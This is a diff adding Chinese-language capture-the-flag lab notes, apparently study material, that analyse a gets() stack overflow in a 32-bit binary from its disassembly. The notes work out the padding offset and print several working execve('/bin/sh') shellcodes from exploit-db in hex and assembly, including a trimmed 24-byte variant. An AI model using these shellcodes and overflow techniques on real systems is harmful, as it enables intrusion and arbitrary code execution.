@@ -137,3 +137,104 @@ note:
 默认ATT，所以加上--intel,汇编最后一句db...去掉，会报错。
 使用cat sc.bin | disasm检查
 最后的shellocde为open('sc.bin').read()+'/tmp/flag\x00'
+
+#lab3
+```
+.text:080484CD ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:080484CD                 public main
+.text:080484CD main            proc near               ; DATA XREF: _start+17↑o
+.text:080484CD
+.text:080484CD s               = byte ptr -14h
+.text:080484CD argc            = dword ptr  8
+.text:080484CD argv            = dword ptr  0Ch
+.text:080484CD envp            = dword ptr  10h
+.text:080484CD
+.text:080484CD ; __unwind {
+.text:080484CD                 push    ebp
+.text:080484CE                 mov     ebp, esp
+.text:080484D0                 and     esp, 0FFFFFFF0h
+.text:080484D3                 sub     esp, 30h
+.text:080484D6                 mov     eax, ds:stdout@@GLIBC_2_0
+.text:080484DB                 mov     dword ptr [esp+0Ch], 0 ; n
+.text:080484E3                 mov     dword ptr [esp+8], 2 ; modes
+.text:080484EB                 mov     dword ptr [esp+4], 0 ; buf
+.text:080484F3                 mov     [esp], eax      ; stream
+.text:080484F6                 call    _setvbuf
+.text:080484FB                 mov     dword ptr [esp], offset format ; "Name:"
+.text:08048502                 call    _printf
+.text:08048507                 mov     dword ptr [esp+8], 32h ; nbytes
+.text:0804850F                 mov     dword ptr [esp+4], offset name ; buf
+.text:08048517                 mov     dword ptr [esp], 0 ; fd
+.text:0804851E                 call    _read
+.text:08048523                 mov     dword ptr [esp], offset aTryYourBest ; "Try your best:"
+.text:0804852A                 call    _printf
+.text:0804852F                 lea     eax, [esp+30h+s]
+.text:08048533                 mov     [esp], eax      ; s
+.text:08048536                 call    _gets
+.text:0804853B                 nop
+.text:0804853C                 leave
+.text:0804853D                 retn
+.text:0804853D ; } // starts at 80484CD
+.text:0804853D main            endp
+```
+gets溢出
+
+and     esp, 0FFFFFFF0h
+
+sub     esp, 30h
+
+相当于sub esp,38h,所以padding的长度为ebp-(esp+30h-14h)=1Ch
+
+在exploit-db上找了下shellcode:
+
+https://www.exploit-db.com/exploits/41757/
+
+https://www.exploit-db.com/exploits/41750/
+
+```
+x64(len=21):
+shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
+;================================================================================
+; nasm -f elf64 ./shellcode.asm
+; ld -o shellcode shellcode.o
+; objdump -d ./shellcode
+                mul esi
+                push rax
+                mov rdi, "/bin//sh"
+                push rdi
+                mov rdi, rsp
+                mov al, 59
+                syscall
+;================================================================================
+
+x86(len=21):
+shellcode = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+;================================================================================
+                xor ecx, ecx
+                push 0bH
+                pop eax
+                cdq
+                push edx
+                push "//sh"
+                push "/bin"
+                mov ebx, esp
+                int 80H
+```
+在测试中发现，push操作破环了shellcode自己。
+使用https://www.exploit-db.com/exploits/37069/,删除冗余的两个字节，得到只有一个只有一个push操作的shellcode，长度为24（加上\x00为25）:
+
+```
+shellcode="\x31\xc9\xf7\xe1\xb0\x0b\xeb\x04\x5b\x51\xcd\x80\xe8\xf7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+;================================================================================
+     xor    ecx, ecx
+     mul    ecx
+     mov    al, 0xb
+     jmp    jjj
+   ccc:
+     pop    ebx
+     push   ecx
+     int    0x80
+   jjj:
+     call   ccc
+     db  "/bin/sh"
+```
